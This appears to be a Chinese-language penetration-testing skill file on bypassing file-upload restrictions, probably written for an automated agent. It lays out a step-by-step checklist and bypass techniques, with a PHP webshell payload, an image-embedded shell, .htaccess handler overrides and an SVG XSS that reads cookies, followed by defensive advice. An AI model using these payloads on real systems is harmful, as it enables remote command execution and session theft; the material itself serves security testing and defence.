---
name: web-upload-001
description: "文件上传限制绕过技术用于在目标系统对上传文件实施扩展名过滤、MIME 类型检查、内容检测等安全措施时，通过伪造文件头、利用解析差异、上传特殊配置文件等方式绕过限制并上传可执行文件 适用于: 应用提供文件上传功能（头像、文档、图片、附件等）; 上传功能对文件类型进行限制（扩展名白名单/黑名单、MIME 类型检查）; 上传的文件存储在 Web 可访问目录"
license: MIT
metadata:
  author: HOS-Sec-Engine
  version: 2026-06
  tags:
  - upload
  - bypass
  - file-type
  - extension
  - mime
  - rce
  category: web
  risk-level: critical
  confidence: 0.93
---
# File Upload Restriction Bypass
文件上传限制绕过技术用于在目标系统对上传文件实施扩展名过滤、MIME 类型检查、内容检测等安全措施时，通过伪造文件头、利用解析差异、上传特殊配置文件等方式绕过限制并上传可执行文件。核心原理是找到应用层验证逻辑与服务器解析逻辑之间的差异。
## 何时使用

### 触发场景

- 应用提供文件上传功能（头像、文档、图片、附件等）
- 上传功能对文件类型进行限制（扩展名白名单/黑名单、MIME 类型检查）
- 上传的文件存储在 Web 可访问目录
- 无法直接上传 .php/.jsp/.aspx 等可执行文件
- 上传后文件被重命名或移动到其他目录

### 关键词

`文件上传`, `upload`, `file upload`, `绕过`, `bypass`, `扩展名过滤`, `文件类型限制`, `mime type`, `content-type`, `whitelist`, `黑名单`, `头像上传`, `附件上传`

### 识别指标

- upload
- file type not allowed
- invalid file extension
- unsupported file type
- forbidden file type

### 别名

`upload bypass`, `file type restriction`, `extension filter`, `mime check bypass`, `magic bytes bypass`, `文件解析漏洞`, `上传漏洞`, `webshell上传`

## 操作检查清单

1. 确认上传功能入口和参数（表单字段、API 端点）
2. 识别验证层（前端 JS、后端代码、WAF、代理）
3. 分析扩展名验证方式（白名单/黑名单/正则）
4. 分析 MIME 类型验证方式（Content-Type 头检查）
5. 分析内容验证方式（magic bytes、图片尺寸、文件头）
6. 确认文件存储路径和 URL 映射关系
7. 确认服务器类型和版本（Apache/Nginx/IIS/其他）
8. 尝试扩展名绕过（变体扩展名、双扩展名、大小写）
9. 尝试 MIME 类型伪造（修改 Content-Type 头）
10. 尝试文件头伪造（添加 magic bytes 前缀）
11. 尝试特殊文件上传（.htaccess、web.config、.user.ini）
12. 验证上传文件是否可通过 URL 访问和执行

## 技术手段

- 扩展名变体绕过：.php → .phtml, .php3, .php5, .php7, .pht
- 双扩展名绕过：file.php.jpg → Apache 可能解析为 PHP
- 大小写绕过：.PhP, .PHP, .pHp（Windows 不区分大小写）
- MIME 类型伪造：Content-Type: image/jpeg 配合 PHP 代码
- 文件头伪造：GIF89a + PHP 代码（伪造 GIF 文件头）
- 图片马：合法图片中插入 PHP 代码（copy normal.jpg /b + shell.php /a webshell.jpg）
- .htaccess 上传：AddType application/x-httpd-php .jpg
- Null 字节截断：file.php%00.jpg（PHP < 5.3.4）
- 空格/点号截断：file.php. 或 file.php （Windows 特性）
- SVG XSS：SVG 文件中包含 <script> 标签
- ZIP/TAR 解压上传：上传压缩包，服务端解压后获取可执行文件
- 文件覆盖：上传同名文件覆盖现有可执行文件

## 实战经验

### 症状

- 上传 .php/.jsp 文件时提示 "不允许的文件类型"
- 前端或后端对文件扩展名进行白名单/黑名单过滤
- MIME 类型检查拦截非图片/文档类型
- 文件内容检查（magic bytes）验证文件头
- 上传成功后文件无法通过 URL 直接访问

### 根因分析

- 扩展名白名单不完整（如允许 .phtml/.php3/.php5 等 PHP 变体扩展名）
- 服务器配置支持多扩展名解析（如 file.php.jpg 被 Apache 解析为 PHP）
- MIME 类型检查仅依赖 Content-Type 请求头，可被伪造
- 内容检测只验证文件头 magic bytes，不检查文件内容
- 文件名处理逻辑存在截断/覆盖漏洞（如 Null 字节截断）
- 解析器配置错误（如 .htaccess 上传后修改解析规则）
- 第三方库解析漏洞（如图片处理库的缓冲区溢出）

### 实战观察

- Apache 解析规则：从左到右识别扩展名，file.php.xxx 会尝试解析 PHP
- IIS 6.0 支持目录解析 /xxx.asp/ 和分号解析 file.asp;.jpg
- Nginx 配置错误时可导致任意文件解析为 PHP（fastcgi_split_path_info）
- PHP-FPM 配置中 fix_pathinfo=1 会导致路径信息被错误解析
- 部分 WAF 只检测请求体，对 multipart/form-data 的 boundary 处理不完善
- SVG 文件可包含 JavaScript 代码，在某些场景下可执行

### 常见错误

- 只尝试修改扩展名，忽略 MIME 类型也需要匹配
- 未验证服务器实际解析规则就盲目上传
- 忽略文件内容检查，直接上传纯代码文件
- 未考虑文件存储路径和 URL 映射关系
- 过度依赖自动化工具，忽略手动分析验证逻辑

### 补充说明

- 不同 Web 服务器（Apache/Nginx/IIS）解析规则差异很大
- 部分绕过技术依赖特定服务器版本或配置
- 上传漏洞利用需要结合存储路径和访问 URL 分析
- 现代上传组件通常结合多种验证方式，需要综合绕过

## 示例

### GIF 文件头 + PHP 代码绕过

伪造 GIF 文件头绕过内容检测，同时包含可执行 PHP 代码

```
原始文件: <?php system($_GET['cmd']); ?>
绕过文件:
GIF89a
<?php system($_GET['cmd']); ?>
原理: 服务器检查文件头 magic bytes 是否为 GIF89a，而 PHP 解释器从 <?php 开始执行
     文件同时满足图片格式检查和服务端执行条件
适用: 仅检查文件头 magic bytes 的场景
```

### 双扩展名 Apache 解析绕过

利用 Apache 从左到右解析扩展名的特性，使用双扩展名绕过白名单

```
原始请求: 上传 shell.php → 被拦截（.php 不在白名单）
绕过请求: 上传 shell.php.jpg → 存储为 shell.php.jpg
Apache 配置: AddType application/x-httpd-php .php
访问 URL: http://target/uploads/shell.php.jpg
原理: Apache 从左到右检查扩展名，发现 .php 后按 PHP 执行
     注意：需要 Apache 未配置 Strict 模式，且 .jpg 在白名单中
适用: Apache 服务器，扩展名白名单包含图片类型
```

### .htaccess 配置上传

上传 .htaccess 文件修改目录解析规则，使普通文件按 PHP 执行

```
上传文件: .htaccess
文件内容: AddType application/x-httpd-php .jpg
或: <FilesMatch "shell.jpg">
      SetHandler application/x-httpd-php
    </FilesMatch>
然后上传: shell.jpg（包含 PHP 代码）
访问 URL: http://target/uploads/shell.jpg
原理: .htaccess 会覆盖 Apache 目录级配置，修改文件类型映射
     需要服务器允许 .htaccess 覆盖（AllowOverride All）
适用: Apache 服务器，AllowOverride 配置宽松
```

### SVG 文件 XSS 绕过

上传包含 JavaScript 的 SVG 文件，在其他用户访问时触发 XSS

```
上传文件: payload.svg
文件内容:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
  <circle cx="50" cy="50" r="40" fill="red" />
</svg>
原理: SVG 是 XML 格式的图片文件，可包含 <script> 标签
     在浏览器中直接访问 SVG URL 时会执行其中的 JavaScript
适用: 允许上传 SVG 文件的场景（如图标、矢量图上传）
```

### MIME 类型伪造 + 扩展名绕过组合

同时修改扩展名和 MIME 类型，绕过双重验证

```
原始请求:
  文件名: shell.php
  Content-Type: application/x-php
  结果: 被拦截（扩展名和 MIME 都被检测）
绕过请求:
  文件名: shell.phtml
  Content-Type: image/jpeg
  文件内容: GIF89a + PHP 代码
  结果: 通过验证（.phtml 可能被遗漏，MIME 伪造为图片）
原理: 组合多种绕过技术，同时满足扩展名和 MIME 类型检查
适用: 同时检查扩展名和 MIME 类型的场景
```

## 验证标准

### 验证指标

- 文件上传成功且返回存储路径
- 上传文件可通过 URL 直接访问
- 访问上传文件时返回 HTTP 200 状态码
- 访问上传文件时服务器执行其中的代码（如 PHP）
- 文件内容检查未拦截（文件大小、类型与实际内容匹配）

### 成功标志

- 上传响应包含文件路径或 URL
- 访问上传文件 URL 返回预期内容
- PHP 代码执行成功（如 phpinfo() 输出、命令执行结果）
- XSS payload 在浏览器中触发（弹窗、Cookie 输出）
- 服务器返回执行结果而非静态文件内容

### 误报标志

- 文件可访问但代码未执行（仅作为静态文件返回）
- 上传成功但文件存储在不可访问目录
- 文件被重命名导致无法预测 URL
- 服务器配置严格，所有变体扩展名都被拦截

## 防御建议

### 推荐做法

- 使用白名单严格限制允许的扩展名（仅 .jpg/.png/.pdf 等安全类型）
- 不要依赖 MIME 类型验证（可被伪造），应检查文件内容
- 使用安全的文件存储路径（非 Web 可访问目录，或通过控制器访问）
- 上传文件重命名为随机 UUID，消除扩展名解析风险
- 配置 Web 服务器禁止上传目录的执行权限
- 对图片文件进行重新编码/压缩处理，清除恶意内容
- 实施文件大小限制，防止资源耗尽攻击
- 使用防病毒扫描引擎检查上传文件

### 缓解措施

- 配置 Nginx/Apache 禁止上传目录的脚本执行权限
- 使用对象存储（如 S3/OSS）存储上传文件，隔离执行环境
- 实施内容安全策略（CSP），限制脚本执行来源
- 定期审计文件上传功能的验证逻辑
- 监控上传目录的异常文件访问模式

## 参考链接

- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://portswigger.net/web-security/file-upload
- https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- https://book.hacktricks.xyz/pentesting-web/file-upload
